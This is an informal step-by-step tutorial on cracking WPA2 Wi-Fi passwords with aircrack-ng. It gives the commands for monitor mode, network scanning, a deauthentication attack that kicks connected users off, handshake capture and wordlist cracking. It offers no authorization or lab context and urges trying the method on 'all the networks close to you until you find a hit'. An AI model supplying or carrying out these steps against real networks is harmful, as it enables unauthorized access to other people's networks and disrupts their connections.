First you would need the "aircrack-ng" package.


First we find out what your wireless card is named with the commmand
> ifconfig (it usually starts with wl)

then run this command to turn on monitor mode if your wirless card has that capability
> airmon-ng start wlp1s0 (in sudo)

OR 

> ifconfig wlo1 down
> iwconfig wlo1 mode monitor
> ifconfig wlo1 up

then run this command to check if its in monitor mode:
> iwconfig

wlp1s0    IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

if it isnt in monitor mode this probably means your wireless card does not support monitor mode.

and sometimes the airmon-ng command changes the network card's name


After that we run this command to check for the wireless networks that we can listen to

> airodump-ng wlp1s0


their we want to save the BSSID and the channel (CH)

 44:E9:68:42:8D:28  -86        6        0    0   4  130   WPA2 CCMP   PSK  Wifi_Perso_2.4G                         

With this information we can use the next command to let us see who is connected to that particular Wifi network

> airodump-ng -d 44:E9:68:42:8D:28 -w file_name -c 4 wlp1s0



Now we want to deauthenticate those users so we can capture the 3 way handshake when they reconnect

> aireplay-ng -0 10 -a 44:E9:68:42:8D:28 -c CA:38:21:BD:44:44 wlp1s0

this is called a deauthentication attack

we are sending 10 deauthentication packets to selected target

After the target is deauthenticated, it will try to reconnect and thats when we will capture the Handshake , it will show on the top right of airodimp-ng, if it hasnt been captured you can repeat the command to deauthenticate or switch targets


After the Handshake is captured, we will see that a couple of files have been saved with the handshake, and now we need to crack them using worlists.

> aircrack-ng -w WORLDLIST_HERE FILE_WITH_THE_HANSHAKE_HER


and then just wait and hope that a key will be found.

If no key is found, try the same method with all the networks close to you until you find a hit


After finishing your work, use this command to restart your wirless network card and get it back to normal function

> airmon-ng stop wlp1s0
> systemctl restart net*


Or 
> ifconfig wlo1 down
> iwconfig wlo1 mode managed
> ifconfig wlo1 up

> sudo systemctl restart networking

Enjoy
